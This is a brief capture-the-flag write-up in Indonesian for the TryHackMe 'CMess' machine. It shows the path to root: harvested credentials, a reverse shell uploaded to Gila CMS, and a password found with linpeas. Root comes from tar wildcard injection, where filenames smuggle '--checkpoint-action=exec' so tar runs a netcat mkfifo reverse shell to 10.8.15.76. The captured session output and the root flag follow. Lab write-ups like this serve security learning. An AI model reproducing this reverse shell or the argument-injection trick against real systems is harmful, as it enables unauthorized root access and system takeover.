Enum subdomain dapet dev.blablaba 
- Dapet email pass buat login (andre@cmess.thm:KPFTN_f2yxe%)
- Upload rev shell di gila cms, revshell.
- UQfsdCB7aAP6 -> nemu di .password dari linpeas. 
- ssh andre@cmess.thm, pass: UQfsdCB7aAP6
- 	```
	echo "mkfifo /tmp/shxgqqn; nc 10.8.15.76 1234 0</tmp/shxgqqn | /bin/sh >/tmp/shxgqqn 2>&1; rm /tmp/shxgqqn" > shell.sh
	echo "" > "--checkpoint-action=exec=sh shell.sh"
	echo "" > --checkpoint=1
	tar cf archive.tar *
 	```

 	```
	wuvel@wuvel:~$ nc -lnvp 1234

	listening on [any] 1234 ...
	connect to [10.8.15.76] from (UNKNOWN) [10.10.34.217] 49888
	ls
	archive.tar
	--checkpoint=1
	--checkpoint-action=exec=sh shell.sh
	note
	shell.sh
	whoami
	root
	cat /root/root.txt
	thm{9f85b7fdeb2cf96985bf5761a93546a2}
 	```

